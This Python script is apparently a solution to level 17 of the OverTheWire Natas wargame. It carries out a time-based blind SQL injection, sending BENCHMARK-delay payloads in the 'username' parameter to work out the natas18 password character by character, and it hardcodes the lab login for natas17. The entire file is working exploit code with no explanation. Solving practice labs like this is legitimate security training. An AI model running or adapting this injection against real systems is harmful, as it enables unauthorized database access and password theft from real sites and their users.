#!/usr/bin/python

import urllib, requests, string

chars = string.ascii_letters + string.digits

auth = ("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")
url = "http://natas17.natas.labs.overthewire.org?"
accuracy = 20
max_delay = 1.3
min_delay = 0.9

# check_query = "username=\"natas18\""
params = {
    "debug": "1",
    "username": "" 
}

def make_params(search_query):
    check_query = "password like binary %s" % search_query

    if_query = "SELECT count(*) FROM users where %s and username=\"natas18\"" % check_query

    timeout_query = "-IF((%s),BENCHMARK(10000000, rand()), 0)" % if_query

    params["username"] = "\"%s and \"1=1" % timeout_query

char_ranges = []
for _ in range(accuracy):
    pass_chars = ''
    for char in chars:
        make_params("\"%" + char + "%\"")
        r = requests.get(url + urllib.parse.urlencode(params), auth=auth)
        # print(r.elapsed.total_seconds())
        if max_delay > r.elapsed.total_seconds() > min_delay:
            pass_chars += char 
    print(pass_chars)
    char_ranges.append(pass_chars)

known_chars = {}
for char_range in char_ranges:
    for char in char_range:
        if not char in known_chars:
            known_chars[char] = 1
        else:
            known_chars[char] += 1

pass_chars = ''
for char in known_chars:
    if known_chars[char] > accuracy / 2:
        pass_chars += char

print("Using Char Set:", pass_chars)

password = ''
for _ in range(64):
    for char in pass_chars:
        make_params("\"" + password + char + "%\"")
        r = requests.get(url + urllib.parse.urlencode(params), auth=auth)
        if max_delay > r.elapsed.total_seconds() > min_delay:
            password += char 
            print(password)